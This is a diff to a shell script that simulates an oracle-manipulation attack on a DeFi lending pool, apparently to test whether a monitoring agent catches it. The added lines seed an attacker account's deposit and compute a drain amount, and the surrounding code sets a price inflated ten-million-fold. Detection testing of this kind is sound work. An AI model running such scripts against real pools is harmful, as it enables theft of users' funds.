@@ -112,14 +112,13 @@ send_async_and_wait() {
 
 INFLATED_PRICE=10000000000000000000000000   # 1e25 — 10,000,000x normal
 NORMAL_PRICE=1000000000000000000             # 1e18 — restore after attack
-DRAIN_AMOUNT=50000000000000000000            # 50 pUSD
+DRAIN_CAP=50000000000000000000               # 50 pUSD upper bound
 
 echo "==> RPC:                  $RPC"
 echo "==> Pool:                 $POOL"
 echo "==> pUSD:                 $PUSD"
 echo "==> Attacker EOA:         $EOA"
 echo "==> Inflated price:       $INFLATED_PRICE  (10^7 x normal)"
-echo "==> Drain amount:         $DRAIN_AMOUNT  (50 pUSD)"
 
 # --- Step 1: capture baseline -----------------------------------------------
 prev_price="$(cast call "$POOL" "getAssetPrice(address)(uint256)" "$PUSD" --rpc-url "$RPC" | awk '{print $1}')"
@@ -127,6 +126,27 @@ prev_reserve="$(cast call "$PUSD" "balanceOf(address)(uint256)" "$POOL" --rpc-ur
 echo
 echo "==> Pre-attack price:     $prev_price"
 echo "==> Pre-attack reserve:   $prev_reserve"
+
+# --- Step 1.5: ensure attacker has a withdrawable position ------------------
+# `pool.withdraw(asset, amount, to)` reverts when amount > balanceOf(asset, attacker)
+# — when that revert hits, no Withdraw event is emitted and the agent
+# never sees the attempt. Top up the position when it's empty.
+attacker_bal_raw="$(cast call "$POOL" "balanceOf(address,address)(uint256)" "$PUSD" "$EOA" --rpc-url "$RPC" | awk '{print $1}' | sed 's/_.*$//')"
+attacker_bal="${attacker_bal_raw:-0}"
+echo "==> Attacker pool balance: $attacker_bal"
+if [ "$attacker_bal" = "0" ] || [ "$attacker_bal" = "" ]; then
+  echo
+  echo "==> Step 1.5: attacker has 0 pool deposit — supplying 60 pUSD so the drain has something to take"
+  send_async_and_wait "approve/seed" \
+    "$PUSD" "approve(address,uint256)" "$POOL" 60000000000000000000
+  send_async_and_wait "supply/seed" \
+    "$POOL" "supply(address,uint256,address)" "$PUSD" 60000000000000000000 "$EOA"
+  attacker_bal=60000000000000000000
+fi
+# Drain half the available balance, capped at DRAIN_CAP. awk handles the
+# bigint math (bash arithmetic overflows above 2^63).
+DRAIN_AMOUNT="$(awk -v b="$attacker_bal" -v c="$DRAIN_CAP" 'BEGIN { half=b/2; print (half<c)?half:c }' | sed 's/\..*$//')"
+echo "==> Drain amount:         $DRAIN_AMOUNT  (≤ half of attacker balance, ≤ 50 pUSD)"
 
 # --- Step 2: manipulate oracle ---------------------------------------------
 echo
